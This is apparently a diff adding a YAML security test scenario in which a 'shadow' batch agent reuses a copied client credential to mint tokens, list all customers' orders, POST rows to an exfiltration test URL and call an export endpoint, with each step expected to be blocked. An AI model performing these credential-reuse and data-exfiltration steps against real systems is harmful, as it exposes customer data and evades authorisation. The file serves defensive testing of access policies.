@@ -1,0 +1,28 @@
+id: S5
+title: Shadow agent with a copied credential
+persona: job:insights-nightly
+agent: insights-nightly
+message: "(cockpit button: Run insights-nightly)"
+trigger: ".*"                       # batch mode always runs the plan
+plan:
+  - token: { grant: client_credentials, client_id: agent-storeops, audience: copperline-tools, save_as: tools_tok }
+  - token: { grant: client_credentials, client_id: agent-storeops, audience: copperline-llm,   save_as: llm_tok }
+  - tool: orders.list_customer_orders
+    args: { customer_id: "*" }
+  - model: { route: premium }
+  - http: { method: POST, url: "${EXFIL_TEST_URL}", body: { rows: 200 } }   # an endpoint YOU control; must succeed without the network policy (Phase 2 check)
+  - http: { method: GET, url: "http://tools.agentic-demo/mcp/orders/export", auth: tools_tok }
+final_reply: "(batch job; no reply)"
+expect:
+  tenant:
+    steps:
+      - { i: 0, status: 200 }                          # IdP does issue a machine-mode token (tools)
+      - { i: 1, status: 200 }                          # ... and (llm)
+      - { i: 2, status: 403, blocked_by: xc }          # sp-tools: tool not allowed + obo_role=none
+      - { i: 3, status: 403, blocked_by: xc }          # sp-llm: premium not allowed for storeops
+      - { i: 4, status: null, blocked_by: network }    # vK8s network policy: connect fails
+      - { i: 5, status: 403, blocked_by: xc }          # service policy and/or API validation (record which)
+    xc_log_hint: "tools-lb + llm-lb security events: user=storeops denied at an odd hour (obo_sub=none from cockpit trace unless R20 verifies)"
+  local:
+    steps:
+      - { i: 2, status: 403 }
